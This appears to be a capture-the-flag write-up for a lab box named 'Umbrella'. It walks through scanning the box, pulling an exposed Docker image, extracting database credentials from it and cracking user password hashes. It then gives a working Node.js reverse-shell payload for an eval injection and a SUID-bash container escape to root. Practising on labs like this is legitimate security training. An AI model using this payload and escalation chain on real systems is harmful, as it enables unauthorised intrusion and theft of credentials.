# Umbrella box

```
# Nmap 7.94 scan initiated Sat Jan 20 08:01:27 2024 as: nmap -sC -sV -sT -T4 -p- -oN box 10.10.94.37
Nmap scan report for 10.10.94.37
Host is up (0.035s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
|_  256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
3306/tcp open  mysql   MySQL 5.7.40
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-12-22T10:04:49
|_Not valid after:  2032-12-19T10:04:49
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: SwitchToSSLAfterHandshake, SupportsCompression, SupportsLoadDataLocal, ODBCClient, InteractiveClient, ConnectWithDatabase, FoundRows, LongPassword, LongColumnFlag, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x0Bt.m\x14Nk\x19(
| )\x1E#U>+\x1Faz|
|_  Auth Plugin Name: mysql_native_password
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 20 08:02:20 2024 -- 1 IP address (1 host up) scanned in 52.59 seconds
```

docker registry at port 5000

gobuster gives v2 as valid directory

http://10.10.94.37:5000/v2/_catalog gives

{"repositories":["umbrella/timetracking"]}

so there is an unsecured repo running there, lets try to pull the image

```docker pull ${IP}:5000/umbrella/timetracking```


Add DOCKER_OPTS to /etc/default/docker:

DOCKER_OPTS="--config-file=/etc/docker/daemon.json"


and add the ip:port to /etc/docker/daemon.json insecure-registries

{
	"insecure-registries": [
		"10.10.94.37:5000"
	]
}

Get the tar from the image

```docker save umbrella/timetracking -o timetracking.tar```

and extract

```tar xvf timetracking.tar```

and we have the layers!

extract all layer.tars in the layer directories

```
for dir in `ls -d */`;
do
	pushd $dir
	tar xvf layer.tar
	popd
done
```

interesting stuff in ceca8630f6b5d6f4eb537a3fff6724b78d2fe1461ff8a7e31dfe44f424c479c7 directory

the node app on 8080 is there:

```
cat usr/src/app/app.js  
```

```                                       
const mysql = require('mysql');

const connection = mysql.createConnection({
        host     : process.env.DB_HOST,
        user     : process.env.DB_USER,
        password : process.env.DB_PASS,
        database : process.env.DB_DATABASE
});

// http://localhost:8080/
app.get('/', function(request, response) {

        if (request.session.username) {

                connection.query('SELECT user,time FROM users', function(error, results) {
                        var users = []
                        if (error) {
                                log(error, "error")
                        };

                        for (let row in results){

                                let min = results[row].time % 60;
                                let padded_min = `${min}`.length == 1 ? `0${min}` : `${min}`
                                let time = `${(results[row].time - min) / 60}:${padded_min} h`;
                                users.push({name : results[row].user, time : time});
                        }
                        response.render('home', {users : users});
                });

        } else{
                response.render('login');
        }

});



// http://localhost:8080/time
app.post('/time', function(request, response) {

    if (request.session.loggedin && request.session.username) {

        let timeCalc = parseInt(eval(request.body.time));
                let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

                connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
                        if (error) {
                                log(error, "error")
                        };

                        log(`${username} added ${time} minutes.`, "info")
                        response.redirect('/');
                });
        } else {
        response.redirect('/');;
    }

});

// http://localhost:8080/auth
app.post('/auth', function(request, response) {

        let username = request.body.username;
        let password = request.body.password;

        if (username && password) {

                let hash = crypto.createHash('md5').update(password).digest("hex");

                connection.query('SELECT * FROM users WHERE user = ? AND pass = ?', [username, hash], function(error, results, fields) {

                        if (error) {
                                log(error, "error")
                        };

                        if (results.length > 0) {

                                request.session.loggedin = true;
                                request.session.username = username;
                                log(`User ${username} logged in`, "info");
                                response.redirect('/');
                        } else {
                                log(`User ${username} tried to log in with pass ${password}`, "warn")
                                response.redirect('/');
                        } 
                });
        } else {
                response.redirect('/');
        } 

});


```

mysql connection is made there:

```
const connection = mysql.createConnection({
        host     : process.env.DB_HOST,
        user     : process.env.DB_USER,
        password : process.env.DB_PASS,
        database : process.env.DB_DATABASE
});
```

So docker inspect to find the environment variables:

```docker inspect 10.10.94.37:5000/umbrella/timetracking```

```
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NODE_VERSION=19.3.0",
                "YARN_VERSION=1.22.19",
                "DB_HOST=db",
                "DB_USER=root",
                "DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5",
                "DB_DATABASE=timetracking",
                "LOG_FILE=/logs/tt.log"
```

login to mysql:

```
mysql -h ${IP} -u root -p"Ng1-f3\!Pe7-e5?Nf3xe5"   
```

```
MySQL [timetracking]> select * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+
```

2ac9cb7dc02b3c0083eb70898e549b63 = Password1
0d107d09f5bbe40cade3de5c71e9e9b7 = letmein
d5c0607301ad5d5c1528962a83992ac8 = sunshine1
4a04890400b5d7bac101baace5d7e994 = sandwich

/time endpoint executes eval on time argument without checking.

We should be able to do ssrf and get a shell with:

this one works, replace port and IP

```
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(12345, "127.0.0.1", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
```

So we are inside the container now, but there are no privesc techniques to explore. All the cgroup vulnerabilities do not work. mount -t cgroup gives permission denied. So no adding mounts and escaping to host this way.

## Logging in over ssh

First try another route and login over ssh (port was open) as claire-r and check for password reuse vulnerability....
Yep that works! logged in with ssh and get user flag.

But many hours of enumeration did not show anything and finally gave up.

## root

After a good night's sleep and more enumeration I decided looking through the mounts again in the container. And yes that was the key. logs in the container is mounted to the host!

Logged in as claire-r over ssh:

```find / -name logs 2>/dev/null```

and the host directory is...

```/timeTracker-src/logs```

Having previously seen this in other boxes, we should be able to get another shell on the host by copying bash to the log directory in the container and then it appears on the host in the timetracker/logs directory.

```cp /bin/bash .```

Starting bash from the host works now but then id returns claire-r again and root is forbidden.

So as docker runs privileged and we are root inside the container we have to set suid on bash first.

```chmod u+s ./bash```

Then we move to ssh again fire up bash again with the -p flag.

```./bash -p```

and there you go, we are root!
